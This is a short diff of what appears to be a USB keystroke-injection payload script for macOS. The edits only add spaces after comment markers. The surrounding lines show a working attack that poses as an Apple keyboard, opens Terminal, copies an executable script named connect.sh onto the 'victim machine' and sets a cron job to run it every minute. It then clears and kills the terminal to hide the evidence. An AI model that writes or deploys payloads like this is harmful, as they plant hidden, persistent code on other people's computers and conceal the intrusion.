@@ -7,12 +7,12 @@
 # Target:        MacOS
 # Attackmodes:   HID, Storage
 
-#Sets attack modes and stores current switch position
+# Sets attack modes and stores current switch position
 LED SETUP
 ATTACKMODE HID STORAGE VID_0X05AC PID_0X021E
 GET_SWITCH_POSITION
 
-#Moves the shell script connect.sh to victim machine and makes it excecutable
+# Moves the shell script connect.sh to victim machine and makes it excecutable
 LED STAGE1
 RUN OSX terminal
 Q DELAY 2000
@@ -27,7 +27,7 @@ Q ENTER
 Q DELAY 1000
 
 LED STAGE2
-#Makes a cron job that will run the script once every minute
+# Makes a cron job that will run the script once every minute
 Q STRING crontab -e
 Q ENTER
 Q DELAY 1000
@@ -41,7 +41,7 @@ Q ENTER
 Q DELAY 2000
 
 LED CLEANUP
-#Clears and kills the terminal to hide the evidence
+# Clears and kills the terminal to hide the evidence
 Q STRING clear
 Q ENTER
 Q DELAY 500
